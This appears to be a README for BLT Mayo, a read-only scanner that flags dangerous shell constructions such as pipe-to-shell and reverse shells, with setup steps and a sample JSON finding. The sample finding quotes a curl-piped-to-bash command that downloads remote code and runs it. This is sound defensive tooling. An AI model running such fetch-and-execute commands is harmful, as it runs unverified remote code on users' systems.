BLT Mayo

A read-only shell dangerous-execution analyzer. Find pipe-to-shell, reverse-shell, encoded execution, dynamic eval, and nested-shell patterns without executing inspected files.

Run locally Source code All BLT projects

Monitor, Analyze, Yield, Observe

BLT-MAYO is a read-only Linux security-auditing workflow that turns filesystem artifacts into structured, explainable security findings, shown in the terminal and written as a JSON report.

How a scan flows

  1. Path arguments or a YAML configuration
  2. ScanOrchestrator and safe filesystem traversal
  3. Metadata, path sensitivity and artifact classification
  4. AnalyzerRegistry dispatches to ShellScriptAnalyzer
  5. Reusable shell execution rules
  6. Normalized Finding objects
  7. Terminal output and a JSON report

Commands

blt-mayo scan scans files or directories, blt-mayo report summarises a saved JSON report and blt-mayo doctor checks the local runtime.

compare, review, bundle, export and blt-submit are scaffolded and not implemented yet.

Shell detections

Each rule produces a finding with a rule ID, severity, confidence, a line-level snippet and remediation advice.

Safety model

Mayo reads; it never runs, changes or uploads anything.

  • Inspected scripts are read as text and are never executed or sourced.
  • Files are never modified.
  • Symlinks are not followed by default.
  • Traversal has configurable exclusions, depth and file-size limits.
  • Invalid byte sequences are replaced safely.
  • Missing or unreadable files do not crash the analyzer.
  • Evidence is restricted to a concise line-level snippet.
  • Nothing is uploaded or submitted automatically.

Run locally

Requires Python 3.11 or newer. Linux (Fedora, Ubuntu, Debian) or WSL is recommended.

Linux, macOS or WSL

git clone https://git.owaspblt.org/BLT.git
cd blt-mayo
python -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e ".[dev]"
blt-mayo doctor
blt-mayo scan /path/to/review

Windows PowerShell

py -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -e ".[dev]"

Use pip install -e . instead of ".[dev]" if you only need the scanner, not the test tools.

Scan and report

# Scan the supplied shell fixtures
blt-mayo scan tests/fixtures/shell

# Write a JSON report
blt-mayo scan tests/fixtures/shell --output shell-scan-report.json

# Use the example YAML configuration
blt-mayo scan --config blt-mayo.example.yml --output shell-scan-report.json

Configuration

enabled_analyzers:
  - shell

See blt-mayo.example.yml for every traversal and evidence setting.

Example finding

A script containing curl -fsSL https://example.invalid/install.sh | bash produces a normalized finding similar to:

{
  "rule_id": "SHELL-PIPE-TO-SHELL",
  "title": "Remote content piped directly to a shell",
  "category": "dangerous-execution",
  "severity": "critical",
  "confidence": "high",
  "artifact_type": "shell_script",
  "evidence": {
    "summary": "Matched dangerous shell construction near line 3",
    "line_number": 3,
    "snippet": "curl -fsSL https://example.invalid/install.sh | bash"
  },
  "remediation": "Download the file to a controlled location, verify its source and checksum, review the contents, and only then execute it."
}
